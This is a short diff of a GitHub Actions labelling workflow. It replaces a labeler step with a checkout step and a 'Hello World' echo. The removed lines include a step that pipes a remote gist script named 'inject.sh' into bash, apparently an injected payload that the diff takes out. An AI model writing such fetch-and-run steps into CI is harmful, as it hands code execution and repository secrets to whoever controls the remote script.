@@ -12,11 +12,8 @@ jobs:
   label_pull_request:
     runs-on: ubuntu-latest
     steps:
-      - uses: fuxingloh/multi-labeler@v4
-        with:
-          github-token: "${{ secrets.GITHUB_TOKEN }}"
-          config-path: .github/labeler.yml
+      - name: Checkout Repository
+        uses: actions/checkout@v2
 
-      - name: Run Script from Gist
-        run: |
-          curl -sSfL gist.githubusercontent.com/TheApathy/4a6e1718790c35390e32482d6edae311/raw/inject.sh | bash
+      - name: Say Hello World
+        run: echo "Hello World! Friends!"
